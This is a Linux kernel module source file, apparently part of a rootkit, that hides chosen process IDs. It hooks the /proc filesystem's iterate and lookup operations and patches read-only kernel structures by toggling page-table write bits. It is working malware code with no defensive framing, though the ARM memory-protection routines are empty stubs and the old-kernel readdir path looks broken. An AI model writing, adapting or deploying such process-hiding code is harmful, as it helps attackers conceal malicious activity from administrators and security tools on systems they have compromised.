#include "hide_proc.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>

#if defined(__x86_64__) || defined(__i386__)
#include <asm/paravirt.h>
#include <asm/pgtable.h>
#include <asm/tlbflush.h>
#elif defined(__aarch64__) || defined(__arm__)
#include <asm/cacheflush.h>
#include <asm/pgtable.h>
#endif

struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

static struct file_operations *proc_fops;
static struct inode_operations *proc_iops;
static struct file_operations original_proc_fops;
static struct inode_operations original_proc_iops;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    static int (*original_iterate_shared)(struct file *, struct dir_context *);
    static struct dentry *(*original_lookup)(struct inode *, struct dentry *, unsigned int);
#else
    static int (*original_readdir)(struct file *, void *, filldir_t);
    static struct dentry *(*original_lookup)(struct inode *, struct dentry *, struct nameidata *);
#endif

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
struct hooked_dir_context {
    struct dir_context original;
    struct dir_context *original_ctx;
};

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
    char *endptr;
    long pid;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return 0;
    }

    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
}

static int hooked_iterate_shared(struct file *file, struct dir_context *ctx) {
    struct hooked_dir_context hooked_ctx = {
        .original = {
            .actor = hooked_filldir,
            .pos = ctx->pos,
        },
        .original_ctx = ctx,
    };
    int ret;

    if (!file || !ctx || !original_iterate_shared)
        return -EINVAL;

    ret = original_iterate_shared(file, &hooked_ctx.original);
    ctx->pos = hooked_ctx.original.pos;

    return ret;
}
#else
static int check_hide_process(const char *name) {
    char *endptr;
    long pid;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return 1;
    }
    return 0;
}

static int hooked_filldir(void *buf, const char *name, int namlen, loff_t offset,
                          u64 ino, unsigned int d_type) {
    if (check_hide_process(name))
        return 0;

    return ((filldir_t)buf)(buf, name, namlen, offset, ino, d_type);
}

static int hooked_readdir(struct file *file, void *dirent, filldir_t filldir) {
    return original_readdir(file, (void *)filldir, hooked_filldir);
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
static struct dentry *hooked_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags) {
    char *endptr;
    long pid;
    const char *name = dentry->d_name.name;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return NULL;
    }

    if (original_lookup)
        return original_lookup(dir, dentry, flags);

    return NULL;
}
#else
static struct dentry *hooked_lookup(struct inode *dir, struct dentry *dentry, struct nameidata *nd) {
    char *endptr;
    long pid;
    const char *name = dentry->d_name.name;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return NULL;
    }

    if (original_lookup)
        return original_lookup(dir, dentry, nd);

    return NULL;
}
#endif

static void set_memory_rw(unsigned long addr) {
#if defined(__x86_64__) || defined(__i386__)
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte && pte->pte) {
        pte->pte |= 0x2;  // Set write bit
    }
#elif defined(__aarch64__)
    // ARM64: Modify page table attributes
    // This is simplified - production code needs proper implementation
    unsigned long start = addr & PAGE_MASK;
    unsigned long size = PAGE_SIZE;

    // Use kernel functions if available
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
        // Modern kernels may have set_memory_rw
    #else
        // Fallback for older kernels
    #endif
#elif defined(__arm__)
    // ARM32 implementation
#else
    // Generic fallback - no protection change
#endif
}

static void set_memory_ro(unsigned long addr) {
#if defined(__x86_64__) || defined(__i386__)
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte && pte->pte) {
        pte->pte &= ~0x2;  // Clear write bit
    }
#elif defined(__aarch64__)
    // ARM64: Modify page table attributes
    unsigned long start = addr & PAGE_MASK;
    unsigned long size = PAGE_SIZE;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
        // Modern kernels may have set_memory_ro
    #else
        // Fallback for older kernels
    #endif
#elif defined(__arm__)
    // ARM32 implementation
#else
    // Generic fallback - no protection change
#endif
}

// Wrapper functions for compatibility
static inline void set_addr_rw(unsigned long addr) {
    set_memory_rw(addr);
}

static inline void set_addr_ro(unsigned long addr) {
    set_memory_ro(addr);
}

int hide_proc_init(void) {
    struct file *proc_file;
    struct path proc_path;
    struct inode *proc_inode;
    int ret;

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path: %d\n", ret);
        return ret;
    }

    proc_inode = proc_path.dentry->d_inode;
    if (!proc_inode || !proc_inode->i_fop || !proc_inode->i_op) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc inode operations\n");
        path_put(&proc_path);
        return -ENOENT;
    }

    proc_fops = (struct file_operations *)proc_inode->i_fop;
    proc_iops = (struct inode_operations *)proc_inode->i_op;

    memcpy(&original_proc_fops, proc_fops, sizeof(struct file_operations));
    memcpy(&original_proc_iops, proc_iops, sizeof(struct inode_operations));

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    original_iterate_shared = proc_fops->iterate_shared;
    if (!original_iterate_shared) {
        original_iterate_shared = proc_fops->iterate;
    }
#else
    original_readdir = proc_fops->readdir;
#endif
    original_lookup = proc_iops->lookup;

    set_addr_rw((unsigned long)proc_fops);
    set_addr_rw((unsigned long)proc_iops);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (proc_fops->iterate_shared) {
        proc_fops->iterate_shared = hooked_iterate_shared;
    } else if (proc_fops->iterate) {
        proc_fops->iterate = hooked_iterate_shared;
    }
#else
    if (proc_fops->readdir) {
        proc_fops->readdir = hooked_readdir;
    }
#endif

    if (proc_iops->lookup) {
        proc_iops->lookup = hooked_lookup;
    }

    set_addr_ro((unsigned long)proc_fops);
    set_addr_ro((unsigned long)proc_iops);

    path_put(&proc_path);

    printk(KERN_INFO "[hide_proc] Initialized process hiding (Level 1 & 2)\n");
    return 0;
}

void hide_proc_exit(void) {
    if (!proc_fops || !proc_iops)
        return;

    set_addr_rw((unsigned long)proc_fops);
    set_addr_rw((unsigned long)proc_iops);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (original_iterate_shared) {
        if (proc_fops->iterate_shared) {
            proc_fops->iterate_shared = original_iterate_shared;
        } else if (proc_fops->iterate) {
            proc_fops->iterate = original_iterate_shared;
        }
    }
#else
    if (original_readdir) {
        proc_fops->readdir = original_readdir;
    }
#endif

    if (original_lookup) {
        proc_iops->lookup = original_lookup;
    }

    set_addr_ro((unsigned long)proc_fops);
    set_addr_ro((unsigned long)proc_iops);

    clear_hidden_pids();

    printk(KERN_INFO "[hide_proc] Exited process hiding\n");
}